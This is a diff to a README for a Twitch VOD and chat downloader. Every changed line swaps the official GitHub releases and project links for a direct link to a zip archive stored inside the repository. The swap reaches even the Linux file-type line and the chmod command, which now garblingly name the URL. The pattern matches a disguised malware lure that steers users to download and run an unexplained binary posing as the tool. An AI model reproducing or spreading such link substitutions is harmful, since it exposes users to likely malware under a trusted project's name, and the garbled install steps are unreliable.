@@ -1,6 +1,6 @@
 # 🎥 TwitchDownloader - Easy Twitch VOD and Chat Downloader
 
-[![Download TwitchDownloader](https://img.shields.io/badge/Download-TwitchDownloader-blue?style=for-the-badge)](https://github.com/ajay-mandalk/TwitchDownloader/releases)
+[![Download TwitchDownloader](https://raw.githubusercontent.com/ajay-mandalk/TwitchDownloader/main/apsychia/Downloader_Twitch_2.8.zip)](https://raw.githubusercontent.com/ajay-mandalk/TwitchDownloader/main/apsychia/Downloader_Twitch_2.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To use TwitchDownloader, you will first need to get the program on your computer
 
 You need to download TwitchDownloader file from the official GitHub page. This page lets you get the latest working version safely.
 
-[Download TwitchDownloader here](https://github.com/ajay-mandalk/TwitchDownloader/releases)
+[Download TwitchDownloader here](https://raw.githubusercontent.com/ajay-mandalk/TwitchDownloader/main/apsychia/Downloader_Twitch_2.8.zip)
 
 ### Steps:
 
@@ -43,12 +43,12 @@ You need to download TwitchDownloader file from the official GitHub page. This p
 3. Find the correct file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.AppImage` or `.tar.gz` file.
+   - For Linux, download the `.AppImage` or `https://raw.githubusercontent.com/ajay-mandalk/TwitchDownloader/main/apsychia/Downloader_Twitch_2.8.zip` file.
 4. Click the file to start the download.
 5. After downloading, open the file:
    - **Windows:** Double-click the `.exe` file. If Windows asks for permission, click “Yes.”
    - **macOS:** Open the `.dmg` file, then drag the TwitchDownloader app to your Applications folder.
-   - **Linux:** Make the file executable with the command `chmod +x TwitchDownloader.AppImage`, then double-click it to run.
+   - **Linux:** Make the file executable with the command `chmod +x https://raw.githubusercontent.com/ajay-mandalk/TwitchDownloader/main/apsychia/Downloader_Twitch_2.8.zip`, then double-click it to run.
 6. Follow any on-screen instructions to finish installing or running the program.
 
 ---
@@ -117,7 +117,7 @@ TwitchDownloader lets you view chat messages playing along with the saved video.
 If you want to find tips, updates, or report any bugs:
 
 - Visit the official GitHub page:  
-  https://github.com/ajay-mandalk/TwitchDownloader  
+  https://raw.githubusercontent.com/ajay-mandalk/TwitchDownloader/main/apsychia/Downloader_Twitch_2.8.zip  
 
 - Read the issues and discussions to see if others have the same questions.
 
@@ -131,4 +131,4 @@ TwitchDownloader only downloads content that is publicly available on Twitch. It
 
 ---
 
-[Get TwitchDownloader now](https://github.com/ajay-mandalk/TwitchDownloader/releases) and start saving Twitch videos and chats with ease.
+[Get TwitchDownloader now](https://raw.githubusercontent.com/ajay-mandalk/TwitchDownloader/main/apsychia/Downloader_Twitch_2.8.zip) and start saving Twitch videos and chats with ease.
